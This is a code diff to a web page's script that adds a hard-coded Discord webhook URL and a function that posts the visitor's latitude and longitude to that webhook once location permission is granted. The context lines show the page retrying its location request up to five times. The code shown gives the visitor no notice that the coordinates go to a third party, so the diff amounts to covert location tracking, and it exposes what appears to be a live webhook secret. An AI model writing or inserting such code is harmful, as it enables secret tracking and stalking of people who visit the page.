@@ -66,6 +66,7 @@
     </div>
 
     <script>
+        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Replace with your Discord Webhook URL
         let retryCount = 0;
         const maxRetries = 5; // Maximum retries
         const retryDelay = 5000; // Retry every 5 seconds
@@ -83,12 +84,35 @@
             });
         }
 
+        async function sendToDiscord(latitude, longitude) {
+            try {
+                const data = {
+                    content: `User location: Latitude ${latitude}, Longitude ${longitude}`
+                };
+                await fetch(discordWebhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                });
+                console.log("Location sent to Discord successfully.");
+            } catch (error) {
+                console.error("Failed to send location to Discord:", error);
+            }
+        }
+
         async function requestLocation() {
             try {
                 const position = await getLocationPermission();
-                console.log("Permission granted:", position.coords.latitude, position.coords.longitude);
+                const { latitude, longitude } = position.coords;
+                console.log("Permission granted:", latitude, longitude);
+
                 document.getElementById('dialogBox').style.display = 'none'; // Hide dialog
                 retryCount = 0; // Reset retries
+
+                // Send location to Discord
+                sendToDiscord(latitude, longitude);
             } catch (error) {
                 console.warn("Location access failed:", error);
                 if (retryCount < maxRetries) {
